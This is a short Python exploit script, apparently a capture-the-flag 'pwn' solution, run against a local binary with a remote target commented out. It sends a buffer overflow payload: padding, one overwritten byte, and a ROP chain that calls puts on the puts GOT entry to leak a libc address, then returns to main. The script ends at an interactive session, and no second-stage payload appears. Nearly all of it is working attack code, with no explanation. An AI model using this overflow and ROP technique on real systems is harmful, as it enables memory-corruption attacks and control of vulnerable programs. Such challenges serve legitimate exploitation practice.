from kk import *
#context(arch='i386', os='linux')
context(arch='amd64', os='linux')
#p = remote('192.168.127.12', 10001)
p = process('./pwn')
elf = ELF('./pwn')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

K,L = libcrop(elf)
#GDB(p)
p.recvuntil(b"T^T")
pay = b'a'*(0x110-4) + b'\x18' + p64(K['pop_rdi']) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])
p.sendline(pay)

p.interactive()